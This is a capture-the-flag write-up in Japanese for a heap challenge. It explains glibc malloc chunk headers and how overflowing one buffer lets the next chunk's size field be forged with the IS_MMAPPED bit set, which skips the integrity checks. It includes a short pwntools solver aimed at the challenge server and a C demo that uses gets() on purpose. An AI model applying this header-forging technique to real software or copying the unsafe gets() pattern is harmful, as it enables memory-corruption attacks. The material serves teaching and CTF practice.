# what-is-my-size

## / Overview

オーバーフローを用いたmallocヘッダの書き換え

16バイトの文字列領域`buf_1`と`buf_2`が連続して`malloc`されます。

その後、`buf_1`に対して任意の長さのデータを入力し、`malloc_usable_size(buf_2)==256`になればシェルが起動します。

## / Writeup

mallocを用いてヒープに領域が確保される時、同時に`prev_size`と`size`ヘッダが8バイトずつ付与されます。そのため、実際のヒープ上では連続して確保した`buf_1`, `buf_2`は次の様になっています。

| アドレス(オフセット) | 内容 |
| :---: | :---: |
| 0x00 | prev_size(buf_1) |
| 0x08 | size(buf_1) |
| 0x10 | data(buf_1) |
| 0x18 | data(buf_1) |
| 0x20 | prev_size(buf_1) |
| 0x28 | size(buf_2) |
| 0x30 | data(buf_2) |
| 0x38 | data(buf_2) |

`size`はヘッダを含むデータの大きさを表す領域ですが、これは必ず8の倍数になるため、下位3ビットはフラグとして使われています。最下位からそれぞれPREV_INUSE(P)フラグ、IS_MMAPPED(M)フラグ、NON_MAIN_ARENA(A)フラグと言い、それぞれ「直前の領域が使われているか」「mmapで確保された領域か」「メインのヒープ領域以外で作られたか」を管理しています。

```
63                                                            3   2   1   0  (ビット位置)
+-------------------------------------------------------------+---+---+---+
|                      size (61 bits)                         | A | M | P |
+-------------------------------------------------------------+---+---+---+
```

今回の目標は、`buf_1`の入力時に発生するバッファオーバーフローを利用して`buf_2`のヘッダを書き換え、`malloc_usable_size(buf_2)`の返り値を`256`にすることです。

`malloc_usable_size()` の返り値は、`size`ヘッダのMビットの値によって計算式が変わります。

1. Mビットが0の場合
   
計算式は`チャンクサイズ - 8`はですが、厳密な整合性チェックが行われます。「現在のチャンク + チャンクサイズ」のメモリアドレスにアクセスし、そこにあるPビット(自分自身)が `1` であるかを確認します。

2. Mビットが1の場合

計算式は`チャンクサイズ - 16`で他のチャンクと隣り合わない独立したメモリ領域であるという前提の仕様上、次のチャンクの整合性チェックが完全にスキップされます。

もし単純にサイズを大きく偽装し、Mビットを0のままにした場合、glibcは未初期化領域を読みに行き、Pビットが0で矛盾していると判定して検証に失敗し、結果として0を返してしまいます。

そこで、攻撃として**Mビットを1に偽装する**ことで、整合性チェックをバイパスし、任意のサイズを信じ込ませます。

目標とする返り値は `256` です。Mビットが1の場合の計算式に当てはめると、必要なチャンクサイズが逆算できます。

* `チャンクサイズ - 16 = 256`
* `チャンクサイズ = 272 (16進数で 0x110)`

したがって、buf_2のsizeを0x110に偽装し、そこにMビット0x2と、Pビット0x1を加算した0x113を書き込めばよいことが分かります。(実はPフラグとAフラグは関係ないので0x112, 0x116, 0x117も解になる)

メモリ配置から、`buf_1` のデータ領域の先頭から `buf_2` の `size` までのオフセットは以下の通りです。
* `buf_1` data: 16バイト
* `buf_2` prev_size: 8バイト
* 合計: 24バイト

これを踏まえ、ソルバは以下のようになります。リトルエンディアンであることに注意してペイロードを構成します。

<details> <summary>solver</summary>

```py
from pwn import *

p = remote("34.170.146.252", 15220)
p.sendafter(b"input>", b"AAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x13\x01\x00\x00\x00\x00\x00\x00\n")
p.interactive()
```

</details>

## / Appendix

今回の議論を可視化するために作成したスクリプトになります。書き換え後のヒープに加えて、追加で`buf_1`をfreeした後も可視化しています。これにより、今回は説明していない`fd`, `bk`の挙動や、実際にはチャンクサイズはヘッダを含めて32以上の16の倍数にアラインメントされる挙動を確かめることができます。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <malloc.h>

// メモリの中身を可視化する処理を関数として独立
void print_heap(char *ptr, int is_freed) {
    for (int i = 0; i < 32 * 2; i++) {
        printf("%02x\t", (unsigned char)*(ptr + i - 16));

        if (i % 8 == 7) {
            if (i % 32 == 7) {
                printf("<- prev_size\n");
            } else if (i % 32 == 15) {
                size_t val = *(size_t *)(ptr + i - 16 - 7);
                size_t P = val & 0x1;
                size_t M = (val & 0x2) >> 1;
                size_t S = val & ~0x7UL;
                
                if (M == 0) {
                    printf("<- size (Mビット: %zu, Pビット: %zu) -> Mビット無効なのでサイズは%zu-8\n", M, P, S);
                } else {
                    printf("<- size (Mビット: %zu, Pビット: %zu) -> Mビット有効なのでサイズは%zu-16\n", M, P, S);
                }
            } else if (i % 32 == 23) {
                if (is_freed && i < 32) {
                    printf("<- fd (tcache: next)\n");
                } else {
                    printf("<- data\n");
                }
            } else if (i % 32 == 31) {
                if (is_freed && i < 32) {
                    printf("<- bk (tcache: key)\n");
                } else {
                    printf("<- data\n");
                }
            }
        }
    }
}

int main(void) {
    char *buf_1 = (char *)malloc(0x10);
    char *buf_2 = (char *)malloc(0x10);
    
    printf("input(buf_1)> ");
    gets(buf_1);

    printf("\n=== free実行前 (Allocated) ===\n");
    print_heap(buf_1, 0); // is_freed を 0 として呼び出し

    printf("\nusable_size(buf_2): %lu\n", malloc_usable_size(buf_2));
    
    free(buf_1);

    printf("\n=== free実行後 (Freed) ===\n");
    print_heap(buf_1, 1); // is_freed を 1 として呼び出し
    
    return 0;
}

__attribute__((constructor))
void setup() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
```

出力例

```
input(buf_1)> ABCDEFG

=== free実行前 (Allocated) ===
00      00      00      00      00      00      00      00      <- prev_size
21      00      00      00      00      00      00      00      <- size (Mビット: 0, Pビット: 1) -> Mビット無効なのでサイズは32-8
41      42      43      44      45      46      47      00      <- data
00      00      00      00      00      00      00      00      <- data
00      00      00      00      00      00      00      00      <- prev_size
21      00      00      00      00      00      00      00      <- size (Mビット: 0, Pビット: 1) -> Mビット無効なのでサイズは32-8
00      00      00      00      00      00      00      00      <- data
00      00      00      00      00      00      00      00      <- data

usable_size(buf_2): 24

=== free実行後 (Freed) ===
00      00      00      00      00      00      00      00      <- prev_size
21      00      00      00      00      00      00      00      <- size (Mビット: 0, Pビット: 1) -> Mビット無効なのでサイズは32-8
1b      ff      74      43      06      00      00      00      <- fd (tcache: next)
67      fd      eb      eb      a5      76      6b      3d      <- bk (tcache: key)
00      00      00      00      00      00      00      00      <- prev_size
21      00      00      00      00      00      00      00      <- size (Mビット: 0, Pビット: 1) -> Mビット無効なのでサイズは32-8
00      00      00      00      00      00      00      00      <- data
00      00      00      00      00      00      00      00      <- data
```